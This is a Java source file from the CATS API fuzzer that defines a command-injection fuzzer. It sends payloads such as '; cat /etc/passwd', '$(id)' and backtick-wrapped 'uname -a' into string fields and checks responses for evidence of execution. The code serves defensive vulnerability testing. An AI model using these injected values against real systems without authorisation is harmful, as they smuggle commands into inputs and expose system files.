package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.List;
import java.util.Locale;

/**
 * Fuzzer that sends OS command injection payloads in string fields.
 * <p>
 * This fuzzer tests for command injection vulnerabilities by sending common
 * OS command injection payloads and analyzing the response for indicators
 * of successful command execution or system information disclosure.
 * </p>
 */
@Singleton
@FieldFuzzer
public class CommandInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {

    private static final List<String> TOP_COMMAND_INJECTION_PAYLOADS = List.of(
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "$(id)",
            "`uname -a`",
            "| dir",
            "; sleep 5",
            "$(echo vulnerable)",
            "\n/bin/ls -la",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
    );

    protected static final List<String> ALL_COMMAND_INJECTION_PAYLOADS = List.of(
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "`ls -la`",
            "$(ls -la)",
            "$(cat /etc/passwd)",
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "$(id)",
            "; uname -a",
            "| uname -a",
            "$(uname -a)",
            "; dir",
            "| dir",
            "& dir",
            "&& dir",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "; echo vulnerable",
            "| echo vulnerable",
            "$(echo vulnerable)",
            "\n/bin/ls -la",
            "\r\n/bin/ls -la",
            "a]); system('ls -la'); //",
            "a]); system('cat /etc/passwd'); //"
    );


    /**
     * Creates a new CommandInjectionInStringFieldsFuzzer instance.
     *
     * @param simpleExecutor          the executor used to run the fuzz logic
     * @param testCaseListener        the test case listener for reporting results
     * @param securityFuzzerArguments the security fuzzer arguments
     */
    public CommandInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                                SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "Command";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_COMMAND_INJECTION_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_COMMAND_INJECTION_PAYLOADS;
    }

    @Override
    public String description() {
        return "iterate through each string field and send OS command injection payloads to detect command injection vulnerabilities";
    }

    @Override
    protected InjectionDetectionResult detectInjectionEvidence(CatsResponse response, FuzzingData data) {
        String responseBody = response.getBody() != null ? response.getBody().toLowerCase(Locale.ROOT) : "";
        int responseCode = response.getResponseCode();

        int executionEvidenceCount = 0;
        StringBuilder evidenceFound = new StringBuilder();

        if (hasPasswdFileContent(responseBody)) {
            executionEvidenceCount++;
            evidenceFound.append("passwd file content, ");
        }

        if (hasIdCommandOutput(responseBody)) {
            executionEvidenceCount++;
            evidenceFound.append("id command output, ");
        }

        if (hasLsCommandOutput(responseBody)) {
            executionEvidenceCount++;
            evidenceFound.append("ls command output, ");
        }

        if (hasUnameCommandOutput(responseBody)) {
            executionEvidenceCount++;
            evidenceFound.append("uname command output, ");
        }

        if (hasWindowsDirOutput(responseBody)) {
            executionEvidenceCount++;
            evidenceFound.append("Windows dir command output, ");
        }

        if (executionEvidenceCount >= 2) {
            return InjectionDetectionResult.vulnerable(
                    "Command injection vulnerability detected",
                    "Response contains multiple indicators of command execution: %s. Response code: %d. This strongly suggests the command was executed on the server."
                            .formatted(evidenceFound.toString().replaceAll(", $", ""), responseCode));
        }

        if (executionEvidenceCount == 1) {
            return InjectionDetectionResult.vulnerable(
                    "Possible command injection vulnerability",
                    "Response contains indicators of command execution: %s. Response code: %d. Manual verification recommended."
                            .formatted(evidenceFound.toString().replaceAll(", $", ""), responseCode));
        }

        return InjectionDetectionResult.notVulnerable();
    }

    private boolean hasPasswdFileContent(String responseBody) {
        return responseBody.contains("root:") && responseBody.contains("/bin/");
    }

    private boolean hasIdCommandOutput(String responseBody) {
        return (responseBody.contains("uid=") && responseBody.contains("gid=")) ||
                (responseBody.contains("uid=") && responseBody.contains("groups="));
    }

    private boolean hasLsCommandOutput(String responseBody) {
        return responseBody.contains("total ") && (responseBody.contains("drwx") || responseBody.contains("-rw-"));
    }

    private boolean hasUnameCommandOutput(String responseBody) {
        return (responseBody.contains("linux") || responseBody.contains("darwin")) &&
                (responseBody.contains("kernel") || responseBody.contains("gnu"));
    }

    private boolean hasWindowsDirOutput(String responseBody) {
        return responseBody.contains("directory of") && responseBody.contains("volume serial number");
    }
}
